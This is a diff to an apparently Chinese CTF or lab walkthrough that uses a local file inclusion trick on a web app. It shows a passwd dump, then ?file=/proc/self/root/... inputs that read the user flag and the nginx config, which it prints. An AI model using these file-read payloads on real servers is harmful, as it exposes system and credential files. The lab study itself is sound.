@@ -102,5 +102,34 @@ klogd:x:100:101:klogd:/dev/null:/sbin/nologin
 nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin
 514:x:1000:1000::/home/514:/bin/sh
 ```
-在别人得帮助下知道这个user.txt.在这
-file=/proc/self/root/home/514/user.txt
+利用root文件绕过查找到用户flag
+?file=/proc/self/root/home/514/user.txt
+/?file=/proc/self/root/etc/nginx/http.d/default.conf 
+找到nginx的目录/var/www/localhost
+```
+server {
+    listen 80 default_server;
+    root /var/www/localhost;
+    index index.php index.html index.htm;
+
+    location / {
+        try_files $uri $uri/ =404;
+    }
+
+    location ~ \.php$ {
+        try_files $uri =404;
+        fastcgi_pass 127.0.0.1:9000;
+        fastcgi_index index.php;
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        include fastcgi_params;
+    }
+
+    location ~ /\.ht {
+        deny all;
+    }
+
+    location = /404.html {
+        internal;
+    }
+}
+```
